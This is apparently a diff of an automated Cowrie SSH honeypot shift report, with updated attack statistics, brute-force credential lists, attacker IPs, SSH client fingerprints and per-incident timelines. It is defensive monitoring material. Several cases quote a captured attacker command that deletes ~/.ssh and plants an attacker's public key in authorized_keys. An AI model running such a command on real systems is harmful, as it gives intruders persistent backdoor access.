@@ -3,8 +3,8 @@
 | Field | Value |
 |---|---|
 | **Report Date** | 2026-05-01 |
-| **Generated At** | 2026-05-01T19:18:02Z |
-| **Shift Time** | 19:18 UTC |
+| **Generated At** | 2026-05-01T20:58:22Z |
+| **Shift Time** | 20:58 UTC |
 | **Honeypot Status** | ✅ HEALTHY |
 | **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |
 
@@ -14,14 +14,14 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Captured | **2106** |
-| Confirmed Threats | **42** |
-| False Positives Filtered | **2064** (98.0%) |
-| Unique Attacker IPs | **43** |
-| Countries of Origin | **21** |
-| High Severity Cases | **6** |
+| Total Sessions Captured | **360** |
+| Confirmed Threats | **97** |
+| False Positives Filtered | **263** (73.1%) |
+| Unique Attacker IPs | **31** |
+| Countries of Origin | **18** |
+| High Severity Cases | **19** |
 | Medium Severity Cases | **0** |
-| Low Severity Cases | **2100** |
+| Low Severity Cases | **341** |
 | Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |
 
 ---
@@ -30,51 +30,60 @@
 
 | Metric | Value |
 |---|---|
-| Total Auth Attempts | **25** |
-| Unique Credential Pairs | **18** |
-| Unique Usernames | **12** |
-| Unique Passwords | **18** |
-| Successful Auth Pairs | **5** |
+| Total Auth Attempts | **95** |
+| Unique Credential Pairs | **57** |
+| Unique Usernames | **29** |
+| Unique Passwords | **52** |
+| Successful Auth Pairs | **14** |
 
 **Top Usernames:**
 
 | Username | Attempts |
 |---|---|
-| `root` | 7 |
-| `admin` | 3 |
-| `345gs5662d34` | 3 |
-| `a` | 2 |
-| `nil` | 2 |
+| `root` | 20 |
+| `ubuntu` | 10 |
+| `345gs5662d34` | 9 |
+| `admin` | 7 |
+| `test` | 6 |
 
 **Top Passwords:**
 
 | Password | Attempts |
 |---|---|
-| `345gs5662d34` | 3 |
-| `3245gs5662d34` | 3 |
-| `a` | 2 |
-| `` | 2 |
+| `345gs5662d34` | 9 |
+| `3245gs5662d34` | 9 |
+| `1` | 4 |
+| `root` | 2 |
 | `admin` | 2 |
 
 **Top Credential Pairs:**
 
 | Username | Password | Attempts |
 |---|---|---|
-| `345gs5662d34` | `345gs5662d34` | 3 |
-| `root` | `3245gs5662d34` | 3 |
-| `a` | `a` | 2 |
-| `nil` | `` | 2 |
-| `admin` | `admin` | 2 |
+| `345gs5662d34` | `345gs5662d34` | 9 |
+| `root` | `3245gs5662d34` | 9 |
+| `ec2-user` | `ec2user` | 2 |
+| `test` | `xxxxxx` | 2 |
+| `ec2-user` | `passwd` | 2 |
 
 **⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**
 
 | Username | Password | Source IP | Timestamp |
 |---|---|---|---|
-| `root` | `asd1230.` | `103.52.152.101` | 2026-05-01T17:33:56 |
-| `root` | `3245gs5662d34` | `103.52.152.101` | 2026-05-01T17:33:59 |
-| `root` | `admin!@#$%^&` | `34.78.29.97` | 2026-05-01T19:10:58 |
-| `root` | `3245gs5662d34` | `34.78.29.97` | 2026-05-01T19:11:02 |
-| `root` | `aliali` | `34.78.29.97` | 2026-05-01T19:12:36 |
+| `root` | `tetsuser` | `34.78.29.97` | 2026-05-01T19:18:17 |
+| `root` | `3245gs5662d34` | `34.78.29.97` | 2026-05-01T19:18:21 |
+| `root` | `test124` | `34.78.29.97` | 2026-05-01T19:19:04 |
+| `root` | `test_user` | `34.78.29.97` | 2026-05-01T19:24:56 |
+| `root` | `linuxserver` | `34.78.29.97` | 2026-05-01T19:26:38 |
+| `root` | `admin` | `36.35.165.163` | 2026-05-01T19:56:07 |
+| `root` | `odoo` | `43.154.195.142` | 2026-05-01T20:14:01 |
+| `root` | `3245gs5662d34` | `43.154.195.142` | 2026-05-01T20:14:05 |
+| `root` | `botserver` | `43.154.195.142` | 2026-05-01T20:20:57 |
+| `root` | `tests` | `103.63.108.25` | 2026-05-01T20:22:51 |
+| `root` | `3245gs5662d34` | `103.63.108.25` | 2026-05-01T20:23:00 |
+| `root` | `odoo` | `103.75.183.233` | 2026-05-01T20:35:31 |
+| `root` | `3245gs5662d34` | `103.75.183.233` | 2026-05-01T20:35:34 |
+| `root` | `botserver` | `103.75.183.233` | 2026-05-01T20:47:09 |
 
 ---
 
@@ -82,34 +91,28 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Parsed | **2106** |
-| Sessions with Fingerprint | **4** |
-| Unique HASSH Fingerprints | **4** |
+| Total Sessions Parsed | **360** |
+| Sessions with Fingerprint | **2** |
+| Unique HASSH Fingerprints | **2** |
 
 **Client Family Distribution:**
 
 | Client Family | Sessions |
 |---|---|
-| libssh | 18 |
-| OpenSSH | 8 |
-| Go SSH scanner | 1 |
+| libssh | 95 |
 
 **⚠️ Botnet/Scanner KEX Signatures Detected:**
 
 | HASSH | Signature | Sessions | IPs |
 |---|---|---|---|
-| `af8223ac9914...` | libssh-based | 16 | 2 |
-| `c118de82e19e...` | Mirai/variant | 8 | 1 |
-| `16443846184e...` | Generic scanner | 1 | 1 |
+| `af8223ac9914...` | libssh-based | 94 | 6 |
 
 **Top Fingerprints:**
 
 | HASSH | Client | Sessions | IPs | Botnet Sig |
 |---|---|---|---|---|
-| `af8223ac9914...` | libssh | 16 | 2 | libssh-based |
-| `c118de82e19e...` | OpenSSH | 8 | 1 | Mirai/variant |
-| `95420f9d932d...` | libssh | 2 | 2 | — |
-| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
+| `af8223ac9914...` | libssh | 94 | 6 | libssh-based |
+| `95420f9d932d...` | libssh | 1 | 1 | — |
 
 ---
 
@@ -117,7 +120,7 @@
 
 | Metric | Value |
 |---|---|
-| Total Command Clusters | **1** |
+| Total Command Clusters | **2** |
 | Campaign Clusters | **1** |
 | Highest Severity | **HIGH** |
 
@@ -125,7 +128,7 @@
 
 | Campaign | Severity | Sessions | IPs | TTPs |
 |---|---|---|---|---|
-| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1070, T1140` |
+| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 4 | `T1021.004, T1078, T1070, T1140` |
 
 **🔴 HIGH · mdrfckr SSH Key Injection**
 
@@ -138,7 +141,7 @@ cd ~; chattr -ia .ssh; lockr -ia .ssh
 ```
 cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
 ```
-Source IPs: `34.78.29.97`, `103.52.152.101`
+Source IPs: `103.63.108.25`, `43.154.195.142`, `103.75.183.233`, `34.78.29.97`
 
 ---
 
@@ -146,107 +149,40 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 
 | Metric | Value |
 |---|---|
-| Total IPs Analysed | **43** |
-| Unique ASNs | **42** |
-| High-Risk ASNs | **9** |
+| Total IPs Analysed | **31** |
+| Unique ASNs | **27** |
+| High-Risk ASNs | **7** |
 | Anon Infrastructure ASNs | **0** |
 
 **Top Attack ASNs:**
 
 | ASN | Provider | IPs | Risk |
 |---|---|---|---|
-| `AS396982` | Google LLC | 2 | HIGH |
-| `AS11845` | Vox Telecom Ltd | 1 | HIGH |
-| `AS55577` | Atria Convergence Technologies Ltd., | 1 | LOW |
-| `AS266181` | GOLDEN LINK | 1 | LOW |
-| `AS135089` | China Telecom | 1 | HIGH |
-| `AS394684` | GOLD DATA USA INC | 1 | LOW |
-| `AS14593` | Space Exploration Technologies Corporation | 1 | LOW |
-| `AS1267` | WIND TRE S.P.A. | 1 | LOW |
+| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
+| `AS396982` | Google LLC | 3 | HIGH |
+| `AS7738` | V tal | 1 | LOW |
+| `AS264605` | TELEVIADUCTO S.R.L. | 1 | LOW |
+| `AS146966` | China Telecom | 1 | HIGH |
+| `AS265473` | DWLINK SERVICOS EM TELECOMUNICACOES LTDA - ME | 1 | LOW |
+| `AS52228` | Cable Tica | 1 | LOW |
+| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |
 
 ---
 
 ---
 
-## 🚨 Priority Cases — Immediate Attention (6)
+## 🚨 Priority Cases — Immediate Attention (19)
 
 > Cases with auth success, command execution, or file downloads.
 > Each requires individual review. Never grouped.
 
-### 🔴 HIGH · IR-3f7e663270b2
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `103.52.152[.]101` |
-| **First Seen** | 2026-05-01 17:33 |
-| **Last Seen** | 2026-05-01 17:33 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-01 17:33:53` | `cowrie.session.connect` |
-| `2026-05-01 17:33:55` | `cowrie.client.version` |
-| `2026-05-01 17:33:55` | `cowrie.client.kex` |
-| `2026-05-01 17:33:56` | `cowrie.login.success` |
-| `2026-05-01 17:33:56` | `cowrie.session.params` |
-| `2026-05-01 17:33:56` | `cowrie.command.input` |
-| `2026-05-01 17:33:56` | `cowrie.command.failed` |
-| `2026-05-01 17:33:56` | `cowrie.log.closed` |
-| `2026-05-01 17:33:56` | `cowrie.session.params` |
-| `2026-05-01 17:33:56` | `cowrie.command.input` |
-| `2026-05-01 17:33:57` | `cowrie.session.file_download` |
-| `2026-05-01 17:33:57` | `cowrie.log.closed` |
-| `2026-05-01 17:33:59` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `103.52.152[.]101` to AbuseIPDB if not already reported
-- [ ] Block `103.52.152[.]101` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-188d3b6fe79a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `103.52.152[.]101` |
-| **First Seen** | 2026-05-01 17:33 |
-| **Last Seen** | 2026-05-01 17:33 |
-| **Session Duration** | 0s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-01 17:33:58` | `cowrie.session.connect` |
-| `2026-05-01 17:33:58` | `cowrie.client.version` |
-| `2026-05-01 17:33:58` | `cowrie.client.kex` |
-| `2026-05-01 17:33:59` | `cowrie.login.success` |
-| `2026-05-01 17:33:59` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `103.52.152[.]101` to AbuseIPDB if not already reported
-- [ ] Block `103.52.152[.]101` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-1ce40be8e767
+### 🔴 HIGH · IR-c3247587496f
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `34.78.29[.]97` |
-| **First Seen** | 2026-05-01 19:10 |
-| **Last Seen** | 2026-05-01 19:11 |
+| **First Seen** | 2026-05-01 19:18 |
+| **Last Seen** | 2026-05-01 19:18 |
 | **Session Duration** | 4s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -259,19 +195,19 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-05-01 19:10:57` | `cowrie.session.connect` |
-| `2026-05-01 19:10:57` | `cowrie.client.version` |
-| `2026-05-01 19:10:57` | `cowrie.client.kex` |
-| `2026-05-01 19:10:58` | `cowrie.login.success` |
-| `2026-05-01 19:10:58` | `cowrie.session.params` |
-| `2026-05-01 19:10:58` | `cowrie.command.input` |
-| `2026-05-01 19:10:58` | `cowrie.command.failed` |
-| `2026-05-01 19:10:58` | `cowrie.log.closed` |
-| `2026-05-01 19:10:59` | `cowrie.session.params` |
-| `2026-05-01 19:10:59` | `cowrie.command.input` |
-| `2026-05-01 19:10:59` | `cowrie.session.file_download` |
-| `2026-05-01 19:10:59` | `cowrie.log.closed` |
-| `2026-05-01 19:11:02` | `cowrie.session.closed` |
+| `2026-05-01 19:18:16` | `cowrie.session.connect` |
+| `2026-05-01 19:18:16` | `cowrie.client.version` |
+| `2026-05-01 19:18:17` | `cowrie.client.kex` |
+| `2026-05-01 19:18:17` | `cowrie.login.success` |
+| `2026-05-01 19:18:17` | `cowrie.session.params` |
+| `2026-05-01 19:18:17` | `cowrie.command.input` |
+| `2026-05-01 19:18:17` | `cowrie.command.failed` |
+| `2026-05-01 19:18:18` | `cowrie.log.closed` |
+| `2026-05-01 19:18:18` | `cowrie.session.params` |
+| `2026-05-01 19:18:18` | `cowrie.command.input` |
+| `2026-05-01 19:18:18` | `cowrie.session.file_download` |
+| `2026-05-01 19:18:18` | `cowrie.log.closed` |
+| `2026-05-01 19:18:21` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
@@ -280,13 +216,13 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 - [ ] Submit download hash(es) to VirusTotal
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-9b20d7d98cda
+### 🔴 HIGH · IR-423ee28bd3ab
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `34.78.29[.]97` |
-| **First Seen** | 2026-05-01 19:11 |
-| **Last Seen** | 2026-05-01 19:11 |
+| **First Seen** | 2026-05-01 19:18 |
+| **Last Seen** | 2026-05-01 19:18 |
 | **Session Duration** | 0s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -296,24 +232,24 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-05-01 19:11:01` | `cowrie.session.connect` |
-| `2026-05-01 19:11:01` | `cowrie.client.version` |
-| `2026-05-01 19:11:01` | `cowrie.client.kex` |
-| `2026-05-01 19:11:02` | `cowrie.login.success` |
-| `2026-05-01 19:11:02` | `cowrie.session.closed` |
+| `2026-05-01 19:18:20` | `cowrie.session.connect` |
+| `2026-05-01 19:18:20` | `cowrie.client.version` |
+| `2026-05-01 19:18:20` | `cowrie.client.kex` |
+| `2026-05-01 19:18:21` | `cowrie.login.success` |
+| `2026-05-01 19:18:21` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
 - [ ] Block `34.78.29[.]97` at perimeter firewall / security group
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-6479a05ca1e0
+### 🔴 HIGH · IR-e00a7ec56e39
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `34.78.29[.]97` |
-| **First Seen** | 2026-05-01 19:12 |
-| **Last Seen** | 2026-05-01 19:12 |
+| **First Seen** | 2026-05-01 19:19 |
+| **Last Seen** | 2026-05-01 19:19 |
 | **Session Duration** | 4s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -326,19 +262,19 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-05-01 19:12:36` | `cowrie.session.connect` |
-| `2026-05-01 19:12:36` | `cowrie.client.version` |
-| `2026-05-01 19:12:36` | `cowrie.client.kex` |
-| `2026-05-01 19:12:36` | `cowrie.login.success` |
-| `2026-05-01 19:12:37` | `cowrie.session.params` |
-| `2026-05-01 19:12:37` | `cowrie.command.input` |
-| `2026-05-01 19:12:37` | `cowrie.command.failed` |
-| `2026-05-01 19:12:37` | `cowrie.log.closed` |
-| `2026-05-01 19:12:37` | `cowrie.session.params` |
-| `2026-05-01 19:12:37` | `cowrie.command.input` |
-| `2026-05-01 19:12:37` | `cowrie.session.file_download` |
-| `2026-05-01 19:12:37` | `cowrie.log.closed` |
-| `2026-05-01 19:12:40` | `cowrie.session.closed` |
+| `2026-05-01 19:19:03` | `cowrie.session.connect` |
+| `2026-05-01 19:19:03` | `cowrie.client.version` |
+| `2026-05-01 19:19:03` | `cowrie.client.kex` |
+| `2026-05-01 19:19:04` | `cowrie.login.success` |
+| `2026-05-01 19:19:04` | `cowrie.session.params` |
+| `2026-05-01 19:19:04` | `cowrie.command.input` |
+| `2026-05-01 19:19:04` | `cowrie.command.failed` |
+| `2026-05-01 19:19:04` | `cowrie.log.closed` |
+| `2026-05-01 19:19:05` | `cowrie.session.params` |
+| `2026-05-01 19:19:05` | `cowrie.command.input` |
+| `2026-05-01 19:19:05` | `cowrie.session.file_download` |
+| `2026-05-01 19:19:05` | `cowrie.log.closed` |
+| `2026-05-01 19:19:08` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
@@ -347,13 +283,13 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 - [ ] Submit download hash(es) to VirusTotal
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-194e2c6e2601
+### 🔴 HIGH · IR-9fc1474901f6
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `34.78.29[.]97` |
-| **First Seen** | 2026-05-01 19:12 |
-| **Last Seen** | 2026-05-01 19:12 |
+| **First Seen** | 2026-05-01 19:19 |
+| **Last Seen** | 2026-05-01 19:19 |
 | **Session Duration** | 0s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -363,15 +299,1476 @@ Source IPs: `34.78.29.97`, `103.52.152.101`
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-05-01 19:12:39` | `cowrie.session.connect` |
-| `2026-05-01 19:12:39` | `cowrie.client.version` |
-| `2026-05-01 19:12:40` | `cowrie.client.kex` |
-| `2026-05-01 19:12:40` | `cowrie.login.success` |
-| `2026-05-01 19:12:40` | `cowrie.session.closed` |
+| `2026-05-01 19:19:07` | `cowrie.session.connect` |
+| `2026-05-01 19:19:07` | `cowrie.client.version` |
+| `2026-05-01 19:19:07` | `cowrie.client.kex` |
+| `2026-05-01 19:19:08` | `cowrie.login.success` |
+| `2026-05-01 19:19:08` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
 - [ ] Block `34.78.29[.]97` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-6b5dc3cd6250
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `34.78.29[.]97` |
+| **First Seen** | 2026-05-01 19:24 |
+| **Last Seen** | 2026-05-01 19:25 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 19:24:56` | `cowrie.session.connect` |
+| `2026-05-01 19:24:56` | `cowrie.client.version` |
+| `2026-05-01 19:24:56` | `cowrie.client.kex` |
+| `2026-05-01 19:24:56` | `cowrie.login.success` |
+| `2026-05-01 19:24:57` | `cowrie.session.params` |
+| `2026-05-01 19:24:57` | `cowrie.command.input` |
+| `2026-05-01 19:24:57` | `cowrie.command.failed` |
+| `2026-05-01 19:24:57` | `cowrie.log.closed` |
+| `2026-05-01 19:24:57` | `cowrie.session.params` |
+| `2026-05-01 19:24:57` | `cowrie.command.input` |
+| `2026-05-01 19:24:57` | `cowrie.session.file_download` |
+| `2026-05-01 19:24:57` | `cowrie.log.closed` |
+| `2026-05-01 19:25:00` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
+- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-08c2e6b5efc7
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `34.78.29[.]97` |
+| **First Seen** | 2026-05-01 19:24 |
+| **Last Seen** | 2026-05-01 19:25 |
+| **Session Duration** | 0s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 19:24:59` | `cowrie.session.connect` |
+| `2026-05-01 19:24:59` | `cowrie.client.version` |
+| `2026-05-01 19:25:00` | `cowrie.client.kex` |
+| `2026-05-01 19:25:00` | `cowrie.login.success` |
+| `2026-05-01 19:25:00` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
+- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-f64599faa366
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `34.78.29[.]97` |
+| **First Seen** | 2026-05-01 19:26 |
+| **Last Seen** | 2026-05-01 19:26 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 19:26:37` | `cowrie.session.connect` |
+| `2026-05-01 19:26:37` | `cowrie.client.version` |
+| `2026-05-01 19:26:37` | `cowrie.client.kex` |
+| `2026-05-01 19:26:38` | `cowrie.login.success` |
+| `2026-05-01 19:26:38` | `cowrie.session.params` |
+| `2026-05-01 19:26:38` | `cowrie.command.input` |
+| `2026-05-01 19:26:38` | `cowrie.command.failed` |
+| `2026-05-01 19:26:38` | `cowrie.log.closed` |
+| `2026-05-01 19:26:39` | `cowrie.session.params` |
+| `2026-05-01 19:26:39` | `cowrie.command.input` |
+| `2026-05-01 19:26:39` | `cowrie.session.file_download` |
+| `2026-05-01 19:26:39` | `cowrie.log.closed` |
+| `2026-05-01 19:26:42` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
+- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-a94a07dac052
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `34.78.29[.]97` |
+| **First Seen** | 2026-05-01 19:26 |
+| **Last Seen** | 2026-05-01 19:26 |
+| **Session Duration** | 0s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 19:26:41` | `cowrie.session.connect` |
+| `2026-05-01 19:26:41` | `cowrie.client.version` |
+| `2026-05-01 19:26:41` | `cowrie.client.kex` |
+| `2026-05-01 19:26:42` | `cowrie.login.success` |
+| `2026-05-01 19:26:42` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
+- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-3fe1339a4334
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `36.35.165[.]163` |
+| **First Seen** | 2026-05-01 19:56 |
+| **Last Seen** | 2026-05-01 19:59 |
+| **Session Duration** | 180s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `start, enable, config terminal, system, linuxshell` |
+| **Download Attempts** | 2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a |
+| **Malware Analysis** | 2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a (LOW) |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-05-01 19:56:06` | `cowrie.session.connect` |
+| `2026-05-01 19:56:07` | `cowrie.login.success` |
+| `2026-05-01 19:56:07` | `cowrie.session.params` |
+| `2026-05-01 19:56:07` | `cowrie.command.input` |
+| `2026-05-01 19:56:07` | `cowrie.command.failed` |
+| `2026-05-01 19:56:07` | `cowrie.command.input` |
+| `2026-05-01 19:56:08` | `cowrie.command.input` |
+| `2026-05-01 19:56:08` | `cowrie.command.failed` |
+| `2026-05-01 19:56:08` | `cowrie.command.input` |
+| `2026-05-01 19:56:08` | `cowrie.command.failed` |
+| `2026-05-01 19:56:08` | `cowrie.command.input` |
+| `2026-05-01 19:56:08` | `cowrie.command.failed` |
+| `2026-05-01 19:56:08` | `cowrie.command.input` |
+| `2026-05-01 19:56:08` | `cowrie.command.failed` |
+| `2026-05-01 19:56:09` | `cowrie.command.input` |
+| `2026-05-01 19:56:09` | `cowrie.command.input` |
+| `2026-05-01 19:56:09` | `cowrie.command.input` |
+| `2026-05-01 19:56:10` | `cowrie.command.success` |
+| `2026-05-01 19:56:10` | `cowrie.command.success` |
+| `2026-05-01 19:56:10` | `cowrie.command.input` |
+| `2026-05-01 19:56:11` | `cowrie.command.input` |
+| `2026-05-01 19:56:45` | `cowrie.command.input` |
+| `2026-05-01 19:56:45` | `cowrie.command.input` |
